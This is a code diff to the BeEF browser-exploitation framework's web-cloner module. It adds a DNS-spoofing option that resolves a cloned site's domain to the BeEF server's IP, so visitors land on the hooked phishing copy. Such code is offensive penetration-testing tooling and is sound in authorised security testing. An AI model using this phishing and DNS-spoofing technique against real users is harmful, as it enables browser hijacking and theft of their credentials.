@@ -7,8 +7,8 @@ module BeEF
   module Extension
     module SocialEngineering
       class WebCloner
+        require 'socket'
         include Singleton
-
 
         def initialize
           @http_server = BeEF::Core::Server.instance
@@ -17,7 +17,7 @@ module BeEF
           @beef_hook = "http://#{@config.get('beef.http.host')}:#{@config.get('beef.http.port')}#{@config.get('beef.http.hook_file')}"
         end
 
-        def clone_page(url, mount, use_existing)
+        def clone_page(url, mount, use_existing, dns_spoof)
           print_info "Cloning page at URL #{url}"
           uri = URI(url)
           output = uri.host
@@ -113,6 +113,18 @@ module BeEF
             @http_server.mount("#{mount}", interceptor.new)
             print_info "Mounting cloned page on URL [#{mount}]"
             @http_server.remap
+
+            # Add a DNS record spoofing the address of the cloned webpage as the BeEF server
+            if dns_spoof
+              dns = BeEF::Extension::Dns::Server.instance
+              ip = Socket.ip_address_list.detect {|i| !(i.ipv4_loopback? || i.ipv6_loopback?)}
+              domain = url.gsub(%r{^http://}, '')
+
+              id = dns.add_rule(domain, Resolv::DNS::Resource::IN::A) do |transaction|
+                transaction.respond!(ip.ip_address)
+              end
+            end
+
             success = true
           else
             print_error "Error cloning #{url}. Be sure that you don't have errors while retrieving the page with 'wget'."
